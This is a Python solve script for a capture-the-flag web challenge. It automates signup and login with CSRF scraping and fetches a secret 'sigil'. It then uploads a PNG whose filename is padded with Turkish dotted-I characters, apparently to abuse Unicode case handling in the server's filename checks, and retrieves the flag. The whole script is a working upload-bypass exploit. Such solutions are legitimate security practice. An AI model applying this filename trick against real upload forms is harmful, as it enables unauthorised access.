import requests
import re
from PIL import Image, PngImagePlugin
import random
import string
import os

url = "http://chals.cyberthon26f.ctf.sg:25184"
s = requests.Session()

def get_csrf(path):
    res = s.get(f'{url}/{path}')

    csrf = re.findall(r'csrf_token" value="(.+)">', res.text)[0].strip()

    return csrf

# login
creds = {
    'username': 'hacker123',
    'password': 'hacker123'
}

res = s.post(f'{url}/signup.php', data={
    'csrf_token': get_csrf('signup.php'),
    **creds,
    'confirm_password': creds['password']
})

res = s.post(f'{url}/login.php', data={
    **creds,
    'csrf_token': get_csrf('login.php')
})

if 'welcome' in res.text.lower():
    print("> Logged in")

# get sigil
res = s.get(f'{url}/get_message.php', params={
    'id': 6
})

sigil = re.findall(r'this:(.+)', res.json()['message'])[0].strip()

print("> Sigil:", sigil)

# upload
def build_payload(title):
    filename = f'{"\u0130" * 4}{''.join(random.sample(string.digits + string.ascii_lowercase, 2))}.spell.png'

    img = Image.new("RGBA", (1, 1))

    metadata = PngImagePlugin.PngInfo()
    metadata.add_text("Title", title)

    img.save(filename, "PNG", pnginfo=metadata)
    return filename

payload_file = build_payload(sigil)

res = s.post(f'{url}/upload.php', data={
    'csrf_token': get_csrf('index.php')
}, files={
    'magic_image': (
        payload_file,
        open(payload_file, 'rb').read(),
        'image/png'
    )
})

if res.json()['success']:
    print("> Payload uploaded")

os.remove(payload_file)

# get flag
res = s.post(f'{url}/validate.php', data={
    'csrf_token': get_csrf('index.php'),
    'filename': payload_file
})

flag = res.json()['message']
print("Flag:", flag)